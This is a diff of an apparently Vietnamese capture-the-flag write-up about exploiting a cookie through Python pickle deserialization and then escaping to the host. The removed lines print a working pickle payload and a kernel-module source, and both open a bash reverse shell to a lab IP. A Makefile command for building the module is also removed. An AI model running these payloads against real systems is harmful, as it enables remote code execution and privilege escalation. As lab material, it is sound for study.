@@ -61,21 +61,7 @@ có vẻ như đây không phải cookie dạng JWT hay PHP-serialized — đây
 
 Dữ liệu chứa các khóa "user" và "revenue" với giá trị "admin" và "85000"
 
-tôi đã thử tệp shell này 
-
-import pickle
-import os
-
-class RCE:
-    def __reduce__(self):
-        return (os.system, ('bash -c "bash -i >& /dev/tcp/10.14.108.226/445 0>&1"',))
-
-# build pickle payload
-payload = pickle.dumps(RCE())
-
-print("[*] Malicious cookie value:")
-# get the hex value
-print(payload.hex())
+tôi đã thử tệp shell pickle.py
 
 <img width="762" height="228" alt="image" src="https://github.com/user-attachments/assets/c8256bda-9402-4d07-87ed-3835196947c5" />
 
@@ -95,34 +81,10 @@ linpeas.sh và deepce.sh là cdk-team/cdk một số công cụ được sử d�
 
 
 tạo một tệp reverse-shell.c
-cat > reverse-shell.c << 'EOF'
-#include <linux/init.h>
-#include <linux/module.h>
-#include <linux/kernel.h>
-#include <linux/kmod.h>
-
-static int __init revshell_init(void) {
-    char *argv[] = {"/bin/bash", "-c", "bash -i >& /dev/tcp/10.14.108.226/1234 0>&1", NULL};
-    static char *envp[] = {"HOME=/", "TERM=linux", "PATH=/sbin:/bin:/usr/bin", NULL};
-    call_usermodehelper(argv[0], argv, envp, UMH_WAIT_PROC);
-    return 0;
-}
-
-static void __exit revshell_exit(void) {
-    printk(KERN_INFO "Reverse shell module unloaded\n");
-}
-
-module_init(revshell_init);
-module_exit(revshell_exit);
-MODULE_LICENSE("GPL");
-MODULE_DESCRIPTION("Reverse Shell Module");
-
-EOF
 
 
 tạo một Makefile
 
-printf $'obj-m += reverse-shell.o\n\nall:\n\tmake -C /lib/modules/6.8.0-1030-aws/build M=$(PWD) modules\n\nclean:\n\tmake -C /lib/modules/6.8.0-1030-aws/build M=$(PWD) clean\n' > Makefile
 
 chạy make
 <img width="788" height="298" alt="image" src="https://github.com/user-attachments/assets/21806951-46b8-4d3e-a14c-2e91ae0323a8" />
